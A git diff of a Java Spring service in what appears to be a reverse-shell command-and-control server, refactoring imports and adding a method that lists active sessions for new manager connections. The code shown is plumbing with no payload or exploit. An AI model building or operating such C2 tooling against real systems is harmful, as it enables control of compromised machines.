@@ -1,14 +1,14 @@
 package com.mtattab.c2cServer.service.impl;
 
-import com.mtattab.c2cServer.model.InitialConnectionMessageModel;
-import com.mtattab.c2cServer.model.ManagerCommunicationModel;
-import com.mtattab.c2cServer.model.MessageEventModel;
+import com.mtattab.c2cServer.model.json.ManagerCommunicationModel;
+import com.mtattab.c2cServer.model.json.MessageEventModel;
 import com.mtattab.c2cServer.model.enums.events.ActiveSessionsEvents;
 import com.mtattab.c2cServer.model.enums.commands.ManagerCommands;
-import com.mtattab.c2cServer.model.exceptions.CommandNotFoundException;
+import com.mtattab.c2cServer.exceptions.CommandNotFoundException;
 import com.mtattab.c2cServer.service.Command;
 import com.mtattab.c2cServer.service.CommandFactory;
 import com.mtattab.c2cServer.service.ReverseShellManagerService;
+import com.mtattab.c2cServer.service.commands.manager.SessionsCommand;
 import com.mtattab.c2cServer.service.factory.ConnectedCommandFactory;
 import com.mtattab.c2cServer.service.factory.ManagerCommandFactory;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
@@ -42,6 +42,9 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
 
     @Autowired
     ManagerCommandFactory managerCommandFactory;
+
+    @Autowired
+    SessionsCommand sessionsCommand;
 
 
     @Override
@@ -84,7 +87,7 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
 
     }
 
-    public boolean handleManagerCommandMessage(WebSocketSession session, TextMessage message, CommandFactory commandFactory) {
+    private boolean handleManagerCommandMessage(WebSocketSession session, TextMessage message, CommandFactory commandFactory) {
         String mangerMessage = message.getPayload();
         log.debug("Manager input is: {}",mangerMessage);
         List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");
@@ -98,6 +101,13 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
             log.warn("[-] Command not found");
             return false;
         }
+
+    }
+
+    public void showSessionsForIntialConnections(WebSocketSession session){
+
+        Command command = sessionsCommand;
+        command.execute(null, session);
 
     }
 
